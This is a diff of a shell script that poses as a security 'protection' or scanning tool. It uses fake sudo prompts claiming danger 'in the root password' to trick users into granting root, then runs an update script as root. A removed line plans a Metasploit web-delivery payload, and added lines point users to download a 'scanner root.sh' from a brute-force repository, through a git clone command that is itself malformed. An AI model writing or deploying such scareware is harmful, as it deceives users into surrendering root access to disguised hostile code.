@@ -83,5 +83,18 @@ echo "Do you suspect something? Select the path and we will check it"
 read $target
 sudo -i -p There.is.something.dangerous.that.exists.in.the.root.password.to.allow.us.to.complete.the.protection.process ./update.sh
 sleep 3
-Put  Script web-delivery python php from Metasploit !!!! 
+echo "ﻰﻠﻋ ﺺﺤﻔﻠﻟ ﺺﺼﺨﻤﻟ​ﺍ ﻒﻠﻤﻟ​ﺍ ﻞﻳﺰﻨﺘﺑ ﻢﻗﻭ ﺕﺎﻴﺣﻼﺻ ﻙﺎﻄﻋﺍ ﻲﺑ ﻡﻮﻘﻧ ﻑﻮﺳ ok ?"
+read target
+echo "1"
+sleep 0.20
+
+echo "2"
+sleep 0.20
+
+echo "3"
+sleep 0.20
+echo "Link>>>>>>>>>>>>>>>"
+echo "git clone https://raw.githubusercontent.com/jihadLkmaty218/Gorilla-Brute-/master/scanner%20root.sh"
+echo "ok?"
+read target
 sudo -i -p GihadAlkmatyhak5
